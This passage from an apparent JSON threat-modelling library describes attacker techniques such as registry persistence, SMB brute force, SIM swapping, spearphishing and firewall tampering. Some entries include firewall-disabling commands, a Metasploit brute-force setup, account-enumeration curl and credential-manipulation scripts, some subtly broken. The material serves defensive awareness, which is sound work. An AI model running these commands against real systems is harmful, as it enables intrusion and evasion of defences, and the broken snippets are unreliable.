                "description": "A threat actor can use scheduled tasks to execute binaries such as LOLBINs\nor malware. LOLBINs is short for 'living off the land binaries', which\nmeans that the threat actors often use native Windows binaries to try to\nhide malicious activity.\n\nA scheduled task to execute a binary is a way for an attacker to ensure \nthat binaries of their choosing and with their settings are run\nautomatically at a specific time or on a regular basis. Scheduled tasks can\nbe set up to run a malicious binaries or LOLBINs in a number of ways, such\nas through the use of the built-in task scheduler in Windows. Once the\nscheduled task is created, it will run the specified binary at the\ndesignated time. It is important to regularly check and disable any\nsuspicious scheduled tasks to protect against this type of attack.\n"
            },
            "5e66f826-4c4b-4357-b9c5-2f40da207f34": {
                "name": "Scheduled tasks to maintain persistence in registry",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "A threat actor can successfully maintain persistence on a compromised system \nby using scheduled tasks to create or edit registry entries.\n\nWindows Scheduled Task is a feature of the Windows operating system that \nallows users to schedule a command or program to run automatically at a \nspecific time or interval. This can be useful for running tasks that need to\nbe performed regularly, such as backing up files or checking for updates. \nScheduled tasks can be configured to run in the background, without the need\nfor user intervention.\n\nOne example for a scheduled task that establish persistence in the registry \nis a task that is configured to run when specific condition is met - as \nexample on system start up. The task will have an action configured, which \nmight be to download and run a payload, which for example could be a payload\nthat sets a registry run key. Registry run keys are keys in the Windows \nregistry that are called during system start up. These keys enable \nconfigurations to be loaded automatically. Registry run keys can also \ndirectly execute binary files on system start up. \n\nTo create a scheduled task that runs at system startup attackers are using \nfor example Windows Task Scheduler, cmd.exe or PowerShell commands in a \nscript. Once the task has been created, it will be added to the registry and \nwill run automatically every time the system starts up, or until discovered \nand deleted.\n\n**Examples for mechanism of persistence in the registries**\n - Run/RunOnce Keys: Malware can add entries to the registry keys (or their RunOnce counterparts) to execute every time the system boots or a user logs in. An example for such Reg keys:  ` HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run `  or   ` HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run `   - Scheduled Tasks: Utilizing the Task Scheduler, malware can create tasks that run at specific intervals or times, ensuring persistence. These tasks are often registered in the registry under  ` HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Schedule\\TaskCache `.\n - Windows Services: Malicious services can be installed and configured to start automatically upon system boot. These are typically registered under `HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services`.\n\n### Additional persistence techniques\n\nOther common techniques used by malware in general include:\n\n- **Modifying Registry Keys**: Malware often alters specific registry keys \n(like those in `HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run`) \nto ensure they are executed at startup.\n\n- **Modifying Registry Keys**: The following enables the malware to run for all \nusers on the system: (HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run)\n\n- **Using Startup Folders**: Malware can place executable files in startup\nfolders so that they run automatically when a user logs into their account.   \n"
            },
            "a566e405-e9db-475f-8447-7875fa127716": {
                "name": "Script execution on Windows for credential manipulation",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "One example of script execution for credential manipulation is the use of a\nPython or other type of script to access and read/change a user's credentials\nstored in a file, such as Windows Credential Manager. \nThe script could be designed to read the file, decrypt the stored\ncredentials, make changes to the username or password, and then save the\nupdated information back to the file. Threat actors are using also different\ncmd utilities in combination with script commands to gain or modify user's\ncredentials. For example, such utilities can be cmdkey, keyring libraries\nand others.\n\nExample for a script that can manipulate a credentials file:\n\nimport os\nimport json\nimport base64\n\n# Function to encrypt the credentials\ndef encrypt_credentials(credentials):\nencoded_credentials = base64.b64encode(json.dumps(credentials).encode())\nreturn encoded_credentials.decode()\n\n# Function to decrypt the credentials\ndef decrypt_credentials(encoded_credentials):\ndecoded_credentials = json.loads(base64.b64decode(encoded_credentials).decode())\nreturn decoded_credentials\n\n# Function to update the credentials\ndef update_credentials(username, password):\n# Reading the credentials from file\nwith open(\"credentials.txt\", \"r\") as file:    encoded_credentials = file.read()\n# Decrypting the credentials\ncredentials = decrypt_credentials(encoded_credentials)\n# Updating the username and password\ncredentials[\"username\"] = username\ncredentials[\"password\"] = password\n# Encrypting the updated credentials\nencoded_credentials = encrypt_credentials(credentials)\n# Saving the updated credentials to file\nwith open(\"credentials.txt\", \"w\") as file:    file.write(encoded_credentials)\n\n# Function call to update the credentials\nupdate_credentials(\"new_username\", \"new_password\")\n\nExample for python code which extracts user's credentials with cmdkey utility:\n\nimport os\n\nos.system('cmdkey /add:TERMSRV/X.X.X.X/user:Administrator /pass:<password>')\nos.system('mstsc /v:X.X.X.X')\nos.system('cmdkey /delete:TERMSRV/X.X.X.X')\n\nExample for keyring library python script for credential manipulation.\nKeyring libraries are used to manage the credentials. In the script threat \nactors are using different functions like: set_credentials(),\nget_credentials() and update_credentials() to set, retrieve or change\nusername and password for the specific user or service. Keyring library\nuses the operating system's secure storage to store the credentials. \nThis secure storage provides credential encryption and the passwords are\nnot stored in plain text.\n\nimport keyring\n\n# Function to set the credentials\ndef set_credentials(username, password):\nkeyring.set_password(\"service_name\", username, password)\n\n# Function to get the credentials\ndef get_credentials():\nusername = input(\"Enter your username: \")\npassword = keyring.get_password(\"service_name\", username)\nreturn username, password\n\nSome credential stealers, for example Ryuk and TrickBot are based on custom\nscripts. For example, TrickBot is configured to use network propagation\nscript modules (sharedll and tabdll) that rely on SMB and can harvest\ncredentials and propagate to additional systems in the network.\n"
            },
            "ce7194f8-2398-4e79-b964-162ca5ee175b": {
                "name": "Secrets stored in repository",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Secrets are digital authentication credentials such as encryption keys,\npasswords, private keys, AWS secrets, Oauth tokens, JWT tokens, Slack\ntokens, API secrets and others. Many of the organizations still keep\nthese secrets in plain-text hardcoded into source code, configuration\nfiles or some of the configuration tools. (ref [1])    \n\nMany developers use GitHub for personal projects and can happen to\nleak by mistake corporate credentials even without rrealizing this.\nThreat actors usually look first at the public repositories on GitHub,\nand then at the ones owned by its employees. They use the collected data\nto access company resources and databases and to compromise further the\ninfrastructure. They may use the collected data also for extortion\npurposes threaten to publish it in public. (ref [2])  \n\nThis may pose a risk because the secrets could be stolen or leaked\nwithout the knowledge of the internal staff. For example, they may be\naccidentally or inadvertently committed in to the source code repository.\nOnce the secret is saved in history it is accessible and exposed to any \nmalicious actor with read access.  \n\nAs a good practice make sure secrets are never stored in source code\nand Software Control Management (SCM) or other configuration tools.\n(ref [3])\n\nExamples for secretes stored in repositories are:  \n\n- Application Programming Interface (API) keys\n- Database credentials\n- Identity and Access Management (IAM) permissions\n- Secure Shell (SSH) keys\n- Certificates    \n\nThere is a growing need for organizations to centralize the storage,\nprovisioning, auditing, rotation and management of secrets to control\naccess to secrets and prevent them from leaking and compromising the\norganization. Often, services share the same secrets, which makes\nidentifying the source of compromise or leak challenging. (ref [1])  \n"
            },
            "a1a17bd4-ec7e-4302-aedf-96ee7c436065": {
                "name": "Self-Service Password Reset (SSPR) abuse in Azure AD",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Self-service password reset (SSPR) is an Azure AD feature that allows users to\nreset their password without the involvement of an administrator or help desk. \nIt is designed for convenience and productivity so that users who forgot their\npassword or get locked out can easily reset it themselves with minimal friction.\n\nAdministrators are able to configure SSPR for the entire organization or a subset \nof groups via the Azure portal. They can also define requirements for permitted \nforms of verification and the number of verification methods required to perform \nthe reset.\n\n## methods\n\nThere are two primary methods through which adversaries have been abusing this tool:\n\n- SIM swapping to gain initial access\n- Attacker registered MFA to establish persistence\n\nSIM swapping is an increasingly popular tactic that adversaries use to take \ncontrol of a target phone number. This typically involves social engineering a\nmobile carrier in order to initiate a number transfer to a new SIM card or\nbribing internal employees to execute a swap. \n\nIf an adversary controls the card and the organization SSPR is configured to\nonly require a single verification method, attackers should have no problem \nestablishing initial access and enroll their own MFA methods for persistence,\ntypically mobile authenticator applications or disposable emails.\n\n\n## reconnaisance\n\nSuccessful SIM swapping needs sufficient preliminary SSPR reconnaissance to\nidentify a viable target. Aside from requiring the information to social engineer\na mobile carrier, the adversary needs to determine whether or not the target is\neven susceptible to SSPR abuse.\n\nGiven any email address, it is easy to validate if it is a valid Microsoft 365 \naccount. The below curl command can be used to determine if a given email address\nis a managed account in Microsoft 365:\n\ncurl -s -X POST https:///login.microsoftonline.com/common/GetCrede... \u2013data \u2018{\u201cUsername\u201d:\u201duser@domain.com\u201d}\u2019\n\nOnce valid Microsoft 365 accounts are identified, attackers initiate the SSPR flow\nto see which verification options are available. Attackers likely need to perform\nthis recon as well if they are going to spend the time and effort performing the\ninitial SIM swap.\n\nThe Microsoft interface that appears during a SSPR clearly indicates whether one \nor two verification methods are required, making it easier for attackers to select\nvulnerable target accounts. \n"
            },
            "55227203-38dc-406b-943a-9c1c6023d1cd": {
                "name": "SharePoint ToolShell vulnerabilities",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "SharePoint zero-day vulnerabilities, known also as `ToolShell` are affecting\non-premise Microsoft SharePoint servers, which enable the attackers to\nexecute code on SharePoint servers without authentication, bypassing\nsecurity mechanisms. This vulnerabilities are considered with a high\nsecurity risk because they may lead to a remote code execution (RCE)\nand a fully compromise of a SharePoint environment. \n\nWhat is known until now for these vulnerabilities is that a threat actor\ndeploys initially a malicious ASPX file `spinstall0.aspx`, also knows as\n`SharpyShell`. The malicious file purpose is to extract and leak\ncryptographic secrets from the SharePoint server using a simple GET request.\nThe goal of the threat actor is to obtain the server's MachineKey\nconfiguration, including the critical ValidationKey , which are essential\nfor generating valid payloads ref [1].    \n\nWith these keys, the attackers can effectively turn any authenticated\nSharePoint request into a remote code execution opportunity, bypassing the\nneed for credentials and gaining full control of the server.  \n\nThe attacker then uses a tool called `ysoserial` to craft their own valid\nSharePoint token for remote code execution with full persistence and no\nauthentication ref [2].\n\nIt was identified successful zero-day exploitation in the SharePoint systems\nof at least seven Union entities. But those incidents were not considered\nas severe incident because the Defender EDR blocked post-compromise attempts.\nBased on the current analysis and investigation there was not detected any\nleak of credentials used for post-exploitation activities.\n\nAt this moment Microsoft released new SharePoint patches to fix these\nvulnerabilities. Microsoft has released security updates that fully protect\ncustomers using all supported versions of SharePoint affected by these two\nvulnerabilities. For more information about patching review the customer\nguidance for SharePoint vulnerability ref [3],[4].   \n"
            },
            "6a7a493a-511a-4c9d-aa9c-4427c832a322": {
                "name": "SIM-card swapping",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "SIM swapping is a malicious technique where threat actors target mobile carriers to gain access to\nusers bank accounts, virtual currency accounts, and other sensitive information.\nThey primarily conduct SIM swap schemes using social engineering, insider threat, or phishing techniques.\n\nSocial engineering involves impersonating an user and tricking the mobile carrier into switching the\nuser's mobile number to a SIM card in the attackers' possession.\n\nAttackers using insider threat to conduct SIM swap schemes pay off a mobile carrier employee to switch an\nuser's mobile number to a SIM card in the attackers' possession. They often use phishing techniques to\ndeceive employees into downloading malware used to hack mobile carrier systems that carry out SIM swaps.\n\nOnce the SIM is swapped, the user's calls, texts, and other data are diverted to the attackers' device.\nThis access allow the attackers to send 'Forgot Password' or 'Account Recovery' requests to the \nuser's email and other online accounts associated with the user's mobile telephone number. \n\nUsing SMS-based two-factor authentication, mobile application providers send a link or one-time passcode \nvia text to the user's number, now owned by the attackers, to access accounts. The attacker uses the codes\nto login and reset passwords, gaining control of online accounts associated with the user's phone profile.\n"
            },
            "fa4c66c6-a69b-4e16-84cb-7ad8c772af41": {
                "name": "SMB login brute force",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "SMB (Server Message Block) brute-force is a type of cyber attack where an\nattacker attempts to guess the password for an SMB share by trying a large\nnumber of possible passwords. The goal is to gain unauthorised access to\nthe SMB share, which can contain sensitive data, such as files, folders,\nand other resources.\n\n### Different methods and techniques used by the threat actors to brute-force an SMB share\n\n- Dictionary attacks - a threat actor is using in this type of an attack a\nlist of common passwords, such as words, phrases, and combinations of\ncharacters, to try and guess the password.\n- Brute force attacks - a threat actor is trying all possible combinations\nof characters, numbers, and special characters to guess the password.\n- Password spraying - in this technique a threat actor uses a small number\nof common passwords against a large number of usernames, in an attempt to\nguess the password for at least one account.\n- Hybrid attacks - combining dictionary and brute force attacks to try and\nguess the password.\n- Rainbow Table Attacks - this is a possible brute-force attack in which a\nthreat actor is using precomputed tables of hash values for common\npasswords to try and guess the password.\n- Exploiting weak passwords - a threat actor may identify and exploit weak\npasswords, such as default passwords, easily guessable passwords, or\npasswords that have not been changed in a long time.\n\nThey can use eumeration tools like nmap, smbclient, Metaspoit and others to\nlisten for an open SMB port and perform automated brute-forcing password\nmatches against an SMB share. \n\n### Automated script tools used for SMB brute-force attack\n\nThreat actors may use different automated tools which have the capability\nto use a wordlist and to try logon attemts to an SMB share. For example,\nbat, batch, PowerShell or other type of scripts and tools based on these\nscripts ref [3], [4], [5], [7].  \n\nExamples:\n\n- smbrute.bat              (uses `passlist.txt` wordlist) ref [3];\n- Smb.bat script           (uses `Wordlist.txt` wordlist) ref [4];\n- SMBLogin.ps1 script      for more information ref [5]. \n- smblogin-extra-mini.ps1  (uses .\\smblogin.results.txt wordlist)  Minimalistic offensive tool based on PowerShell ref [7].\n\n### Metasploit auxiliary module brute-force SMB share\n\nA threat actor can use a Metasploit auxiliary scanner module to brute force\nthe SMB credentials. In the example below `<user_file>.txt` is a set of\nuser's possible names and `<password_file>.txt` is a list of possible user's\npassword for brute-force attack ref [2].   \n\nExample: \n\n```\n> set RHOST <ip_address>\nRHOST => <ip_address>\n> set PORT 445\nRPORT => 445\n> set user_file ./<user_file>.txt\nuser_file => ./<user_file>.txt\n> set password_file ./<password_file>.txt\npassword_file => ./<password_file>.txt\n\n```\nMetaspoit `run` command runs the auxiliary module and displays if there are\nfound successful brute-force credentials matches. \n\n```\nmsf5 auxilary(scanner/smb/smb_login) > run\n\n```\n"
            },
            "06c60af1-5fa8-493c-bf9b-6b2e215819f1": {
                "name": "Social engineering attack using Microsoft Teams",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Adversaries are using compromised Microsoft 365 tenants to create technical\nsupport-themed domains and send tech support lures via Microsoft Teams, \nattempting to trick users of the targeted organizations using social engineering.    \n\nThey aim to manipulate users into granting approval for multifactor authentication\n(MFA) prompts, ultimately aiming to steal their credentials.    \n\n#### Attack phases    \n\n**Preparation phase**    \n\nAttackers compromise an Azure tenant, rename it and add a new onmicrosoft[.]com\nsubdomain. It will use security-themed or product name-themed keywords to create\na new subdomain, such as teamsprotection.onmicrosoft[.]com \nAdd a new user associated with that domain from which the attacker will send the\noutbound message to the target tenant.    \n\n**Social engineering phase**    \n\nAttackers send a Teams chat message to the target from the compromised external user\nmasquerading as a technical support or security team; if the targeted user accepts\nthe message request, attackers send a Microsoft Teams message to convince the target\nto enter a code into the Microsoft Authenticator app on his/her mobile device.\nIf the targeted user enters the code into the Authenticator app, the attacker is\ngranted a token to authenticate as the targeted user.    \n\n**Post-compromise phase**    \n\nInvolves information theft from the compromised Microsoft 365 tenant, and in some \ncases, adding a device to the organisation as a managed device through Microsoft\nEntra ID (formerly Azure Active Directory), likely an attempt to circumvent conditional\naccess policies configured to restrict access to specific resources to managed devices only.    \n\n#### Additional Tactics: Microsoft Teams Vishing    \n\n### Microsoft Teams Vishing    \n\n- Attackers initiate contact via Microsoft Teams within 15-30 minutes of the email bombing.\n- They pose as IT support personnel or \"Help Desk Managers\".\n- Adversary-controlled Office 365 accounts are used, often with display names mimicking \nlegitimate IT staff.\n- Profile pictures and backgrounds are crafted to appear authentic.\n- Attackers exploit the victim's state of confusion and urgency caused by the email bombing.    \n"
            },
            "0cdaee96-8595-4f3f-ba07-758b8be9d359": {
                "name": "Social engineering without attachment or URL",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "TOAD (Telephone-Oriented Attack Delivery) and BEC (Business Email Compromise) attacks \nare sophisticated forms of social engineering that pose significant threats to organizations. \nThese attacks often bypass traditional email security measures by avoiding the use \nof malicious attachments or URLs.    \n\n## TOAD Attacks    \n\nTOAD attacks combine email and voice phishing techniques to trick victims into disclosing \nsensitive information or transferring funds.    \n\nKey characteristics of TOAD attacks:    \n\n- Initial contact via email, urging the recipient to call a phone number\n- No malicious attachments or URLs in the email\n- Social engineering tactics used during phone conversations\n- Often impersonate legitimate brands or authority figures    \n\n## BEC Attacks    \n\nBEC attacks involve impersonating or compromising legitimate email accounts to deceive \nindividuals into sharing sensitive information or transferring funds.    \n\nKey characteristics of BEC attacks:    \n\n- Highly targeted and personalized emails\n- Often impersonate executives, vendors, or trusted partners\n- Create a sense of urgency\n- Rarely include malicious payloads\n- Frequently target Accounts Payable teams\n"
            },
            "dd5d942c-bac4-4000-b9a6-ca4fef6cfb84": {
                "name": "Spearphishing Attachment",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Spearphishing messages are often crafted using pernicious social engineering\ntechniques.\n\nIn Spearphishing Attachment attacks, recipients receive emails that contain\nmalicious attachments. The email message entices users to open the\nattachment(s) using the knowlege gained.\n\n- displayed sender name is known by the recipient\n- topic/subject is in the field of activity of the recipient\n- urgency of user action (less relevant TTP for spearphishing emails)\n\nThese attachments look like valid files. In some cases, they are disguised\nas MS Office, PDF files or CV files ref [5]. It could be that the attacker\nmanage to capture a legit document, weaponise it and send it to (new)\nrecipients (it has been observed that such attack can occur within tens of\nminutes after the original legit document was released). In addition, there\nhave also been reports of TAMs sending malicious PowerPoint (PPSX) files\nthat exploit vulnerabilities and emails with Word document attachments that\ndo not require macros to be enabled in order to execute.  \n\nAttachments may:\n\n- contain links leading to a page for credential harvesting.\n- be weaponized to install malicious software on the computer of the user or\nrun some actions on the device;\n- or open a decoy document. This is quite frequent in attack conducted by TA\nwhen the malware within the attachment makes some check and assess that the\nwas not opened on the targeted organisation. Decoy document are meant to\nevade detection and avoid raising alert or recipient report to cyber\nsecurity team, such as emails with attached Word documents that do not\nrequire enabling macros to execute.\n\n## Common techniques to evade detection\n\nAttackers may use several way to try to hide visually the true nature of\nthe file.\n\n### Double extensions\n\nAttackers may use double extensions to masquerade the true file type to \ntrick users into opening files that might seem safe. But this TTP is quite\nwell addressed at front email gateway (blocking by default file with several\nextension, usually also when within a compressed file). \n\n### Password-protected attachment\n\nMalicious password-protected archive files are designed to deceive users\nand bypass commonly deployed inspection engines to deliver malware and \nransomware down to a user endpoint. If the Email Security tool detects a\npassword-protected attachment, it will scan the metadata of the file;\nnot the content.\n\n### Right-to-Left Override (RLTO)\n\nAnother technique is to hide the real file extension is Right-to-Left \nOverride (RLTO). Windows supports languages that are written from right \nto left using a Unicode character that causes the text that follows it \nto be displayed in reverse, this method is used to blend the real file \nextension with the file name.\n"
            },
            "1a68b5eb-0112-424d-a21f-88dda0b6b8df": {
                "name": "Spearphishing Link",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Adversaries may send spearphishing emails with a malicious link in an\nattempt to gain access to victim systems. This sub-technique employs\nthe use of links to download malware, instead of attaching malicious\nfiles to the email itself to avoid defences that may inspect email\nattachments.      \n\nAll forms of spearphishing are targeted at a specific individual or\ncompany. Generally, the links will be accompanied by social engineering\ntext and require the user to actively click or copy and paste an URL into\na browser, leveraging user execution. The visited website may compromise\nthe web browser using an exploit, or the user will be prompted to download\napplications, documents, zip files, or even executables depending on the\npretext for the email in the first place. Attackers may also include links\nthat are intended to interact directly with an email reader, including\nembedded images intended to exploit the end system directly or verify\nthe receipt of an email (i.e. web bugs/web beacons).  \n\nIn this type of phishing a threat actor impersonates to appear as\na user's trusted contact like their colleague or other known friends.\nThreat actors can also impersonate a large companies with trustworthy\nimage, brand and reputation to give the emails more believability and\nreach. They put deceptive links in the email to entice a victim to\nclick on the link ref [4, 5].        \n\nIn some of the spearphishing campaigns, a threat actor named Webworm\nwas using GitHub malicious repositories and links to them to spread and\ninfect more developers and end-users. As GitHub is one of the top million\ndomains with a lot of visits and clicks the attacker's goal is to hide\nin plain sight.   \n\n#### AI-themed phishing campaigns\n\nAdversaries create spearphishing links or sites that mimic AI\napplications, which appear to offer legitimate AI tools, tricking\nusers into downloading and executing trojanised AI-themed software.\nFor example, this could lead to the installation of Gipy malware,\na strain of infostealer malware that steals sensitive information\nand loads additional malicious software from GitHub, including\nvarious types of information stealers and remote access trojans.  \n\n#### Themed-documents lure campaigns \n\nSeveral reports mention that the threat actors prepare their campaign \nby using areas of activity and visual identity of companies or public \nadministrations in contact with the targets in order to craft more \ndeceiving and appealing emails to lure the targets. This preparation\naims to raise the successful rate of the phishing campaigns.  \n\nSpearphishing emails prepared to deal with topics in the areas of an \nUnion entity may decive more Union entity staff to follow the link.\nref [b].  \n\nIn one campaign it was observed that after direct exchanges over emails \nand whatsapp messages, the victim received an email having a specifically \ncrafted politically oriented subject with a malicious link ref [e].    \n\n#### Spearphishing via QR Codes (Quishing)\n##### Description\n\nSpearphishing via QR codes, also known as \"quishing,\" is an emerging\ncybersecurity threat where attackers use malicious QR codes to target\nspecific individuals or organizations. This technique combines the\ndeceptive nature of phishing with the convenience of QR codes to trick\nvictims into revealing sensitive information or compromising their\ndevices.  \n\n##### **How Quishing Works**\n\n1. Attackers generate a QR code that leads to a falsified website or\nmalicious content.\n2. The malicious QR code is distributed through various channels, such as\nemails, social media, or even physical locations.\n3. Victims are lured into scanning the QR code, often under the guise of\naccessing exclusive content or necessary information.\n4. Upon scanning, users are directed to phishing websites or trigger the\ndownload of malware.  \n\n#### Spearphishing with enbedded HTML link\n##### Description\n\nEmbedded HTML links in the context of spear phishing, refer\nto malicious links that are embedded within an email or message\nusing HTML code. These links may appear legitimate from a trusted \nsource or known organization but actually they mask their true\ndestionation. For example, they can be encoded or obfuscated\nto hide their source destination.  \n\nExample: \n\nIn one of the reports was observed that clicking a malicious HTML\nlink redirected a victim first to malicious HubSpot Free Forms and then\nto credential harvesting pages mimicking Microsoft Azure and Outlook Web\nApp (OWA) login portals ref [d].      \n"
            },
            "58b98d75-fc63-4662-8908-a2a7f4200902": {
                "name": "Spearphishing with an attachment extension .rdp",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Spearphishing with an attachment extension .rdp refers to a targeted\ncyberattack where a malicious actor sends an email containing a file\nwith the file extension .RDP (Remote Desktop Protocol) to a specific\nindividual or organization. The attacker may send an attachment to\nthe end-users directly or by impersonating companies, institutions\nor particular individuals, sending the lure on behalf of them\nref [1, 2].       \n\nOn October 22, 2024, the National Cyber Security Centers (NCSC) of two\nEU countries, as well as governmental organizations [3] reported that\na spear-phishing campaign with .RDP attachment are impersonating their\nentities.      \n\nThe emails were highly targeted, using social engineering lures relating\nto Microsoft, Amazon Web Services (AWS), and the concept of Zero Trust.\nThe emails contained a Remote Desktop Protocol (RDP) configuration file\nsigned with a LetsEncrypt certificate. RDP configuration (.RDP) files\nsummarize automatic settings and resource mappings that are established\nwhen a successful connection to an RDP server occurs ref [1].       \n\nThis allows the adversary to potentially deploy additional payloads,\nexecute local reconnaissance activities, and to redirect targeted users\nto credential harvesting sites.  \n"
            },
            "ebdf49a9-52cb-43a5-8849-8110765f4fe1": {
                "name": "Suspicious Disk Image Files extracted via File Archiver from Email or Download directory",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Disk image files, such as ISO or IMG files, are being used more lately in malware \ndistribution through phishing emails or malicious download links. \nThis works because, as part of their nature, disk image files bypass some email \nsecurity filters and may not be automatically viewed as threats to the users \nor security applications. This is traditionally a technique that has been used \nby a number of threat actors. One common example in this regard is when \nspearphishing emails have attached disk image files masquerading as some sort \nof legitimate document or even software updates. Once a user opens the attached \ndisk image file, it mounts as a virtual drive on his system. The user may \nthen be tricked into running a malicious payload inside, such as a \nshortcut file (.lnk) or an executable with its icon cloaked to appear familiar. \nUsers are prone to feel secure when they select files with familiar types \nand might not see the danger in mounting and opening disk images coming \nfrom unverified sources."
            },
            "cd1baed8-3ea8-42e1-a27d-9da9ddb2f5b8": {
                "name": "Switching off forced signed commits for GitHub repository",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Development and DevOps teams may turn on signed commits to ensure that an \nattacker cannot commit code to a code repository of an organization by \nmerely succesfully stealing an OAuth token of a developer. With forced \ncommits, the attacker will be blocked from committing code changes to a\nrepository, essentially limiting the attacker from attaining lateral \nmovement or similar objectives, unless the attacker turns off the forced \ncommit policy. \n"
            },
            "be73532a-1994-4db2-945e-ccdf586e2551": {
                "name": "Tampering system firewall on endpoint",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "The firewall is a foundational defensive mechanism designed to control inbound and \noutbound network traffic based on predefined security rules. By disabling \nor tampering with these rules, adversaries effectively remove a key layer of network \nsegmentation and monitoring. This action can allow them to pivot laterally, exfiltrate \ndata without triggering alerts, or execute follow-on attacks with minimal interference \nfrom host-based defenses.  \n\n## Windows \n\nAn attacker with administrative privileges may execute commands such as \n`netsh advfirewall set allprofiles state off` or directly manipulate registry keys :\n(`HKLM\\SYSTEM\\CurrentControlSet\\Services\\SharedAccess\\Parameters\\FirewallPolicy`) \nto turn off or weaken firewall profiles. \nThey may also employ PowerShell scripts or WMI-based methods to silently adjust rules.  \n\n## Linux \n\nThreat actors might run commands like :\n`iptables -F` (flush all rules), `iptables -P INPUT ACCEPT`, \nor tamper with `/etc/iptables.rules` files to ensure that all traffic is allowed. \n\nOn some distributions, adjusting systemd firewall services or security daemons \ncan achieve the same effect.  \n\n## macOS\n\nAttackers could use the `pfctl` command (e.g., `sudo pfctl -d`) to disable the \nPacket Filter firewall, or modify system configuration files that govern firewall rules. \nThey may also exploit launch daemons or kernel extensions to bypass \nor remove firewall protections.  \n"
            },
            "db3cae2f-3e6b-4aed-b346-43686bbb382e": {
                "name": "Typosquatting domain attack for disinformation",
                "model": true,
                "tlp": "clear",
                "criticality": "Medium",
                "description": "Typosquatting, also known as URL hijacking, is a form of cyber attack\nwhere an attacker registers a domain name that is very similar to a\nlegitimate and popular website, often by exploiting common typing\nerrors or misspellings. This is done to deceive users into visiting\nthe fake domain, usually with the intention of spreading disinformation,\nstealing personal information, or installing malware ref [1].  \n\nIn the context of disinformation, typosquatting can be used to create\na fake version of a trusted news source or government website in order\nto spread false or misleading information. By exploiting users' trust\nin familiar domain names, attackers can manipulate public opinion,\nconfusion, and undermine the credibility of legitimate sources.  \n\nThreat actors can impersonate domains in different ways.\n\nSome of them are:\n\n- A common misspelling of the target domain (example: CSOnline.com rather than CSOOnline.com)\n- A different top-level domain (example: using .uk rather than .co.uk)\n- Combining related words into the domain (CSOOnline-Cybersecurity.com)\n- Adding periods to the URL (CSO.Online.com)\n- Using similar looking letters to hide the false domain (\u00c7S\u00d3Onlin\u00e9.com)\n\nTyposquatting is a lookalike domain with one or two wrong or different\ncharacters with the aim of trying to trick people onto the wrong webpage.\n\nThe threat actors can buy and use a domain only with a little change\ncompared to the legitimate and official site of some service.\nIt can be difficult for the end user to recognise the difference, for\nexample between goggle.com and google.com or google.com written with\nsimilar character for the character \"o\" but actually from different\nUTF encoding system. It can looks like a well known and legit\ndomain but to be actually a malicious one with a very close name.\n\nIn some of the cases regarding the security reports typosquatting\ndomain attack is used in malicious campaigns for disinformation.\nFor example, Doppelganger is a pro-Russian misleading information\noperation targeting the European Union (EU) and other geopolitical\nactors. This campaign exploits political, economic, and social\ndivisions within the EU and its member states. \n"
            },
            "97589310-35d6-4e7d-a8b5-2d6cfc6375f4": {
                "name": "Unauthorized changes on shell configuration files",
                "model": true,
                "tlp": "clear",
                "criticality": "High",
                "description": "Attacker may change critical files on Unix-like systems,\n\n* shell initialisation and configuration, such as:  - `/etc/profile`, `/etc/shells`, `/etc/profile.d/*`, `/etc/bash.bashrc`,   `/etc/bashrc`, `/etc/zsh/zprofile`, `/etc/zsh/zshrc`, `/etc/zsh/zlogin`,   `/etc/zsh/zlogout`, `/etc/csh.cshrc`, `/etc/csh.login`,\n* as well as root-owned configuration files, such as:  * `/root/.bashrc`, `/root/.bash_profile`, `/root/.profile`, `/root/.zshrc`,   `/root/.zprofile`\n* and user-specific files, such as:  * `/home/*/.bashrc`, `/home/*/.zshrc`, `/home/*/.bash_profile`,   `/home/*/.zprofile`, `/home/*/.profile`, `/home/*/.bash_login`,   `/home/*/.bash_logout`, `/home/*/.zlogin`, `/home/*/.zlogout`\n\nThese files are typically executed whenever a user logs in or spawns a new \nshell session. By manipulating these files, attackers may:\n\n1. **Introduce malicious code** by modifying the configuration files with \nthe objective of dropping malware to the compromised system, such as \nBackdoors or Trojans.\n2. **Alter system settings**: Changes to the configuration files can modify \nsystem settings, such as environment variables, PATH variables, or other \ncritical settings, which can compromise the system's security and integrity.\n3. **Disable security features** such as audit logging or access controls, \nto evade detection or gain unauthorized access to the system.\n4. **Create unauthorized access**: Modifications to the configuration files \ncan create unauthorized access points, such as adding new users or modifying \nexisting user accounts.\n"
            },
            "a1e8f8b3-48ef-4559-a3a0-ecaed496d5f3": {
                "name": "Unusual use of archiving tools",
                "model": true,
                "tlp": "clear",
                "criticality": "Low",
